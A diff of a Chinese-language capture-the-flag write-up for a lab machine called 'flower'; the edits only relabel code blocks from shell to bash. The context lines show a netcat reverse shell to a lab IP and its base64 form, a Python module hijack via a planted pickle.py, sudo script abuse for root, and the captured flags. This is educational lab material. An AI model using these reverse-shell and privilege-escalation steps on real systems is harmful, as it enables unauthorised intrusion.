@@ -83,7 +83,7 @@ system('nc -e /bin/sh 192.168.56.102 9999') --base64--> c3lzdGVtKCduYyAtZSAvYmlu
 
 成功得到反弹的 shell
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
 [12:15:56] Welcome to pwncat 🐈!                                                                                                                         __main__.py:164
@@ -135,13 +135,13 @@ import os;os.system('/bin/bash')
 
 然后将 payload 写入 `pickle.py` 文件，使得 `import` 的时候可以被控制
 
-```shell
+```bash
 echo "import os;os.system('/bin/bash')" > pickle.py
 ```
 
 然后开始利用
 
-```shell
+```bash
 (remote) www-data@flower:/home/rose/diary$ ls -lh
 total 8.0K
 -rw-r--r-- 1 rose     rose     147 Nov 30  2020 diary.py
@@ -153,7 +153,7 @@ rose
 
 ## user pwned
 
-```shell
+```bash
 rose@flower:~$ cat user.txt
 HMV{R0ses_are_R3d$}
 ```
@@ -170,7 +170,7 @@ User rose may run the following commands on flower:
 
 查看文件的内容
 
-```shell
+```bash
 #!/bin/bash
 echo Hello, write the name of the flower that u found
 read flower
@@ -181,14 +181,14 @@ echo Nice, $flower submitted on : $(date)
 
 虽然 `/home/rose/.plantbook` 文件不具有写入权限，但是其所有权是 `rose` 用户，所以可以直接修改文件权限后直接编辑
 
-```shell
+```bash
 #!/bin/bash
 /bin/bash
 ```
 
 用 poc 覆盖原本 `/home/rose/.plantbook` 的文件内容，然后利用
 
-```shell
+```bash
 rose@flower:~$ sudo /bin/bash /home/rose/.plantbook
 root@flower:/home/rose# whoami
 root
@@ -196,7 +196,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 root@flower:~# cat root.txt 
 HMV{R0ses_are_als0_black.}
 ```
